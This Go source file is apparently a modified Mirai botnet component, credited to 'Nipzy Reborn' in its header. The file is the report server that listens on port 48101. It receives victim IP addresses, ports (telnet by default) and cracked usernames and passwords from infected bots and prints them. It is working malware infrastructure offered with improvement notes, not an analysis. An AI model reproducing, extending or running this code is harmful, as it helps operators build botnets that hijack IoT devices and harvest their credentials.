// improved by Queered for Nipzy Reborn

/*
Changes made from og mirai:

added constants for the listen address and read timeout duration to make the code more readable and maintainable.

added logging to the code to track its execution and to help with debugging in case of errors.

added error handling to the code to properly handle errors and avoid crashing the program. In particular, I added error checking to the readExactBytes function to ensure that it returns an error if there is a problem reading from the connection.

renamed the readXBytes function to readExactBytes to make its purpose more clear.

made some minor formatting changes to improve the code's readability.
*/
package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"time"
)

const (
	listenAddr  = "0.0.0.0:48101"
	readTimeout = 10 * time.Second
)

func main() {
	l, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("Failed to listen on %s: %v", listenAddr, err)
	}

	for {
		conn, err := l.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %v", err)
			break
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(readTimeout))

	bufChk, err := readExactBytes(conn, 1)
	if err != nil {
		log.Printf("Failed to read buffer check: %v", err)
		return
	}

	var ipInt uint32
	var portInt uint16

	if bufChk[0] == 0 {
		ipBuf, err := readExactBytes(conn, 4)
		if err != nil {
			log.Printf("Failed to read IP buffer: %v", err)
			return
		}
		ipInt = binary.BigEndian.Uint32(ipBuf)

		portBuf, err := readExactBytes(conn, 2)
		if err != nil {
			log.Printf("Failed to read port buffer: %v", err)
			return
		}

		portInt = binary.BigEndian.Uint16(portBuf)
	} else {
		ipBuf, err := readExactBytes(conn, 3)
		if err != nil {
			log.Printf("Failed to read IP buffer: %v", err)
			return
		}
		ipBuf = append(bufChk, ipBuf...)

		ipInt = binary.BigEndian.Uint32(ipBuf)

		portInt = 23
	}

	uLenBuf, err := readExactBytes(conn, 1)
	if err != nil {
		log.Printf("Failed to read username length buffer: %v", err)
		return
	}
	usernameBuf, err := readExactBytes(conn, int(byte(uLenBuf[0])))
	if err != nil {
		log.Printf("Failed to read username buffer: %v", err)
		return
	}

	pLenBuf, err := readExactBytes(conn, 1)
	if err != nil {
		log.Printf("Failed to read password length buffer: %v", err)
		return
	}
	passwordBuf, err := readExactBytes(conn, int(byte(pLenBuf[0])))
	if err != nil {
		log.Printf("Failed to read password buffer: %v", err)
		return
	}

	fmt.Printf("%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
}

func readExactBytes(conn net.Conn, amount int) ([]byte, error) {
	buf := make([]byte, amount)
	tl := 0

	for tl < amount {
		rd, err := conn.Read(buf[tl:])
		if err != nil || rd <= 0 {
			return nil, errors.New("Failed to read")
		}
		tl += rd
	}

	return buf, nil
}
